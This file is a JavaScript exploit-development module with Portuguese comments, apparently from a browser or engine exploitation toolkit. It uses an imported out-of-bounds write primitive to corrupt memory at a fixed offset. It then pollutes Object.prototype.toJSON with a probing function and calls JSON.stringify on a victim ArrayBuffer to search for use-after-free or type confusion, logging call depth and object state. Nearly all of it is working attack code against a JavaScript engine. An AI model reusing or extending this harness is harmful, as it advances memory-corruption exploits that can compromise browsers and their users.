// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const TARGETED_UAF_TC_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    // value_to_write será passado como parâmetro para executeUAFTypeConfusionTestWithValue
    bytes_to_write_for_corruption: 4,
    ppKeyToPollute: 'toJSON',
};

export let currentCallCount_for_UAF_TC_test = 0;

// ##########################################################################
// # MODIFIQUE ESTA LINHA PARA CADA TESTE DE PROFUNDIDADE:                  #
// # SUGESTÕES: 20, 50, 100, 250, 500, 1000, 2000                           #
const MAX_toJSON_DEPTH_FOR_ANALYSIS = 3000; // COMECE COM 20 OU 50 PARA O PRÓXIMO TESTE
// ##########################################################################

// Esta é a toJSON que sonda 'this', tem controle de profundidade e tenta slice na Call 1
export function detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice() {
    currentCallCount_for_UAF_TC_test++;
    const currentOperationThis = this;
    const FNAME_toJSON_local = `detailed_toJSON_DepthCtrlSlice(Call ${currentCallCount_for_UAF_TC_test})`;

    // Log de título menos frequente para profundidades maiores
    if (currentCallCount_for_UAF_TC_test === 1 || (currentCallCount_for_UAF_TC_test % Math.min(50, MAX_toJSON_DEPTH_FOR_ANALYSIS) === 0 && currentCallCount_for_UAF_TC_test <= MAX_toJSON_DEPTH_FOR_ANALYSIS) ) {
        document.title = `detailed_toJSON_Slice Call ${currentCallCount_for_UAF_TC_test}/${MAX_toJSON_DEPTH_FOR_ANALYSIS}`;
    }
    
    // Log no console menos frequente para profundidades maiores
    if (currentCallCount_for_UAF_TC_test <= 5 || (currentCallCount_for_UAF_TC_test % Math.min(20, MAX_toJSON_DEPTH_FOR_ANALYSIS/2) === 0 && currentCallCount_for_UAF_TC_test <= MAX_toJSON_DEPTH_FOR_ANALYSIS) || currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS) {
        logS3(`[toJSON Poluído - Detalhado c/ Slice] ${FNAME_toJSON_local} Chamado!`, "vuln");
        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info");
    }

    if (currentCallCount_for_UAF_TC_test > MAX_toJSON_DEPTH_FOR_ANALYSIS) {
        if (currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS + 1) {
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Profundidade máxima (${MAX_toJSON_DEPTH_FOR_ANALYSIS}) atingida. Retornando undefined.`, "info");
            document.title = `toJSON Profundidade Máx (${MAX_toJSON_DEPTH_FOR_ANALYSIS}) Atingida`;
        }
        return undefined;
    }

    let details = { 
        raw_byteLength: "N/A", 
        type_of_raw_byteLength: "N/A",
        assigned_byteLength: "N/A", 
        first_dword_attempt: "N/A", 
        first_dword_value: "N/A",
        slice_exists: "N/A", 
        slice_call_attempt: "N/A",
        slice_call_result: "N/A",
        type_toString: "N/A" 
    };
    let error_accessing_props = null;

    try {
        details.type_toString = Object.prototype.toString.call(currentOperationThis);
        
        details.raw_byteLength = currentOperationThis.byteLength;
        details.type_of_raw_byteLength = typeof details.raw_byteLength;
        details.assigned_byteLength = details.raw_byteLength; 
        
        if (currentCallCount_for_UAF_TC_test <= 5 || currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS) { // Logar byteLength com menos frequência
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ACCESSO DIRETO this.byteLength: ${details.raw_byteLength} (tipo: ${details.type_of_raw_byteLength})`, "info");
        }
        
        details.first_dword_attempt = "Tentado";
        if (currentOperationThis instanceof ArrayBuffer && typeof details.raw_byteLength === 'number' && details.raw_byteLength >=4) {
            try {
                let buffer_to_inspect = currentOperationThis;
                let offset_to_inspect = 0;
                details.first_dword_value = new DataView(buffer_to_inspect, offset_to_inspect, 4).getUint32(0, true);
                details.first_dword_attempt += ", DataView OK";
            } catch (e_dv) {
                logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ERRO ao tentar DataView em 'this' (ArrayBuffer): ${e_dv.message}`, "warn");
                details.first_dword_attempt += `, ERRO DataView em AB: ${e_dv.message}`;
                error_accessing_props = error_accessing_props || `DV AB Error: ${e_dv.message}`;
            }
        } else if (currentOperationThis && !(currentOperationThis instanceof ArrayBuffer) && typeof details.raw_byteLength === 'number' && details.raw_byteLength >=4 && currentOperationThis.buffer instanceof ArrayBuffer) {
            try {
                if (currentOperationThis.buffer.byteLength >= (currentOperationThis.byteOffset || 0) + 4) {
                    details.first_dword_value = new DataView(currentOperationThis.buffer, (currentOperationThis.byteOffset || 0), 4).getUint32(0, true);
                    details.first_dword_attempt += ", DataView (from .buffer) OK";
                } else {
                     details.first_dword_attempt += ", .buffer pequeno ou byteOffset inválido";
                }
            } catch (e_dv_buffer) {
                logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ERRO ao tentar DataView em 'this.buffer': ${e_dv_buffer.message}`, "warn");
                details.first_dword_attempt += `, ERRO DataView em .buffer: ${e_dv_buffer.message}`;
                error_accessing_props = error_accessing_props || `DV .buffer Error: ${e_dv_buffer.message}`;
            }
        } else {
             details.first_dword_attempt += ", 'this' não é AB/buffer válido para DV";
        }

        details.slice_exists = (typeof currentOperationThis.slice === 'function');
        details.slice_call_attempt = "Tentado";
        if (details.slice_exists && currentOperationThis instanceof ArrayBuffer && currentCallCount_for_UAF_TC_test === 1) {
            try {
                logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] 'this.slice' existe (AB). Tentando chamar this.slice(0,1)...`, "info");
                let slice_result = currentOperationThis.slice(0,1); 
                details.slice_call_result = `OK, resultado.byteLength = ${slice_result?.byteLength}, tipo resultado: ${typeof slice_result}`;
                logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] this.slice(0,1) OK. Result type: ${typeof slice_result}, byteLength: ${slice_result?.byteLength}`, "info");
            } catch (e_slice) {
                logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ERRO ao chamar this.slice(0,1) em AB: ${e_slice.message}`, "error");
                details.slice_call_result = `ERRO em AB: ${e_slice.message}`;
                error_accessing_props = error_accessing_props || `Slice AB Error: ${e_slice.message}`;
            }
        } else if (details.slice_exists) {
            details.slice_call_result = "Existe, mas não é AB Call 1, não chamado";
        } else {
             details.slice_call_attempt += ", 'slice' não é função";
        }
        
        if (currentCallCount_for_UAF_TC_test <= 5 || currentCallCount_for_UAF_TC_test % Math.min(50, MAX_toJSON_DEPTH_FOR_ANALYSIS) === 0 || currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS || error_accessing_props) {
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Log Final Detalhes: type='${details.type_toString}', assigned_byteLength=${details.assigned_byteLength} (raw_type: ${details.type_of_raw_byteLength}), 1stDwordVal=${(details.first_dword_value === "N/A" || typeof details.first_dword_value === 'string') ? details.first_dword_value : toHex(details.first_dword_value)} (Attempt: ${details.first_dword_attempt}), slice_exists=${details.slice_exists} (Attempt: ${details.slice_call_attempt}, Result: ${details.slice_call_result})`, error_accessing_props ? "error" : "info");
        }
        
    } catch (e_general) { 
        error_accessing_props = `General Error: ${e_general.message}`;
        logS3(`  [toJSON Poluído - Detalhado c/ Slice] ${FNAME_toJSON_local} ERRO GERAL ao acessar props: ${e_general.message} (Chamada: ${currentCallCount_for_UAF_TC_test})`, "critical");
        document.title = `ERRO GERAL toJSON_DCS Call ${currentCallCount_for_UAF_TC_test}`;
    }
    
    if (error_accessing_props) {
        throw new Error(`Prop Access Error in toJSON_DCS Call ${currentCallCount_for_UAF_TC_test}: ${error_accessing_props}`);
    }
    return { toJSON_executed_detailed_depth_ctrl_slice: true, call: currentCallCount_for_UAF_TC_test, details: details };
}

export async function executeUAFTypeConfusionTestWithValue(
    testVariantDescription,
    valueToWriteOOB 
) {
    const FNAME_TEST = `executeUAFTypeConfusionTest<${testVariantDescription}>`;
    const {
        victim_ab_size,
        corruption_offset, 
        bytes_to_write_for_corruption,
        ppKeyToPollute,
    } = TARGETED_UAF_TC_PARAMS;

    logS3(`--- Iniciando Teste UAF/TC (VaryOOB, DepthTest ${MAX_toJSON_DEPTH_FOR_ANALYSIS}): ${testVariantDescription} ---`, "test", FNAME_TEST);
    logS3(`   MAX_toJSON_DEPTH_FOR_ANALYSIS = ${MAX_toJSON_DEPTH_FOR_ANALYSIS}`, "info", FNAME_TEST);
    logS3(`   Alvo da Corrupção OOB: Offset=${toHex(corruption_offset)}, Valor OOB a Escrever=${toHex(valueToWriteOOB)}`, "info", FNAME_TEST);
    document.title = `Iniciando UAF/TC DCS ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;

    currentCallCount_for_UAF_TC_test = 0;

    let stringifyResult = null; 
    let errorOccurredDuringTest = null;
    let potentiallyFroze = true; 
    let stepReached = "inicio";

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        return { potentiallyFroze: false, errorOccurred: new Error("OOB Setup Failed"), calls: currentCallCount_for_UAF_TC_test, stringifyResult };
    }
    document.title = "OOB Configurado";
    stepReached = "oob_configurado";

    let victim_ab = new ArrayBuffer(victim_ab_size);
    logS3(`ArrayBuffer victim_ab (${victim_ab_size} bytes) recriado. Este será o 'this' na 1a chamada da toJSON.`, "info", FNAME_TEST);
    stepReached = "vitima_criada";

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
    let pollutionAppliedThisRun = true; 
    
    try {
        logS3(`Aplicando PP com detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice...`, "info", FNAME_TEST);
        stepReached = "aplicando_pp";
        document.title = `Aplicando PP DCS ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
        Object.defineProperty(Object.prototype, ppKeyToPollute, {
            value: detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice, 
            writable: true, configurable: true, enumerable: false
        });
        logS3(`Object.prototype.${ppKeyToPollute} poluído com detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice.`, "good", FNAME_TEST);
        stepReached = "pp_aplicada";
        document.title = `PP Aplicada DCS ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;

        logS3(`CORRUPÇÃO OOB: Escrevendo valor ${toHex(valueToWriteOOB)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)} do oob_array_buffer_real`, "warn", FNAME_TEST);
        stepReached = "antes_escrita_oob";
        document.title = `Antes Escrita OOB DCS ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
        oob_write_absolute(corruption_offset, valueToWriteOOB, bytes_to_write_for_corruption);
        logS3("Escrita OOB realizada (no oob_array_buffer_real).", "info", FNAME_TEST);
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita OOB DCS ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
        
        await PAUSE_S3(SHORT_PAUSE_S3); 

        stepReached = "antes_stringify_victim_ab";
        document.title = `Antes Stringify victim_ab DCS ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
        logS3(`Chamando JSON.stringify(victim_ab)... (MAX_DEPTH=${MAX_toJSON_DEPTH_FOR_ANALYSIS})`, "info", FNAME_TEST);
        
        try {
            stringifyResult = JSON.stringify(victim_ab);
            stepReached = "apos_stringify_victim_ab";
            document.title = `Stringify victim_ab Retornou DCS ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
            potentiallyFroze = false; 
            logS3(`Resultado JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}...`, "info", FNAME_TEST);
        } catch (e_stringify) {
            stepReached = "erro_stringify_victim_ab";
            document.title = `ERRO Stringify victim_ab (${e_stringify.name}) DCS ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
            potentiallyFroze = false; 
            errorOccurredDuringTest = e_stringify;
            logS3(`ERRO CAPTURADO JSON.stringify(victim_ab): ${e_stringify.name} - ${e_stringify.message}. (Chamadas toJSON: ${currentCallCount_for_UAF_TC_test})`, "critical", FNAME_TEST);
            if (e_stringify.stack) logS3(e_stringify.stack, "error", FNAME_TEST);
            console.error(`JSON.stringify Test Error for victim_ab (${testVariantDescription}):`, e_stringify);
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal DCS ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
        potentiallyFroze = false;
        errorOccurredDuringTest = mainError; 
        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
        if (mainError.stack) logS3(mainError.stack, "error", FNAME_TEST);
        console.error("Main test error (DCS):", mainError);
    } finally {
        if (pollutionAppliedThisRun) { 
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKeyToPollute];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}. Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}.`, "info", FNAME_TEST);
        if (potentiallyFroze) {
            logS3(`O TESTE PODE TER CONGELADO. Último passo: ${stepReached}. Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}`, "warn", FNAME_TEST);
            document.title = `CONGELOU? DCS Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS} Passo: ${stepReached} - Chamadas: ${currentCallCount_for_UAF_TC_test} - ${testVariantDescription}`;
        }
    }
    logS3(`--- Teste UAF/TC Concluído: ${testVariantDescription} (MAX_DEPTH=${MAX_toJSON_DEPTH_FOR_ANALYSIS}, Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}) ---`, "test", FNAME_TEST);
    if (!potentiallyFroze && !errorOccurredDuringTest) {
        document.title = `Teste UAF/TC DCS ${MAX_toJSON_DEPTH_FOR_ANALYSIS} OK: ${testVariantDescription}`;
    } else if (errorOccurredDuringTest && !document.title.includes("ERRO Str")) { // Evitar sobrescrever título de erro do stringify
        document.title = `ERRO OCORREU DCS ${MAX_toJSON_DEPTH_FOR_ANALYSIS} (${errorOccurredDuringTest.name}) - ${testVariantDescription}`;
    }
    return { potentiallyFroze, errorOccurred: errorOccurredDuringTest, calls: currentCallCount_for_UAF_TC_test, stringifyResult };
}
